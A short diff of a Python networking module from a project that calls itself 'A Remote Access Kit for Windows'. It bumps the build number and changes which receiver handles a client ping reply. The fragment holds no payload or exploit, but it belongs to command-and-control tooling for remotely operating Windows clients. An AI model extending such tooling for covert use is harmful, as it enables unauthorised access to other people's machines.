@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 from core.networking.sockets.server_socket import ServerSocket
 from core.networking.sockets.receiver_socket import ReceiverSocket
@@ -20,7 +20,7 @@ from ..threading.threads import MultiThreading
 class NetHandle:
     #Function will ping the client
     def ping_client(self,encryption_key,client):
-        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_ping_reply,encryption_key)                          #Create socket to catch response in new thread
+        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_to_console, encryption_key)                          #Create socket to catch response in new thread
         ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().ping_client}{ClientActionFlags().seperator} ') #Ping the client
 
     #Function will tell client to reconnect
